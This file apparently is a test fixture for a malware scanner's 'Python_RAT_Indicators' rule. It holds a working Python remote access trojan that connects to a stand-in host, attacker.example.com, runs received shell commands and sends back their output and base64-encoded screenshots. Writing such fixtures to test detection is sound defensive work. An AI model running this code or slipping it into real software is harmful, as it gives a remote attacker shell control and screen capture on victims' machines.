"""Fixture: Python RAT indicators – must trigger Python_RAT_Indicators rule."""
import socket
import subprocess
import base64
from PIL import ImageGrab

C2_HOST = "attacker.example.com"
C2_PORT = 5555

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((C2_HOST, C2_PORT))

while True:
    cmd = s.recv(4096).decode()
    if cmd.startswith("screenshot"):
        img = ImageGrab.grab()
        import io
        buf = io.BytesIO()
        img.save(buf, "PNG")
        s.sendall(base64.b64encode(buf.getvalue()))
    else:
        out = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        s.sendall(out.stdout.read() + out.stderr.read())
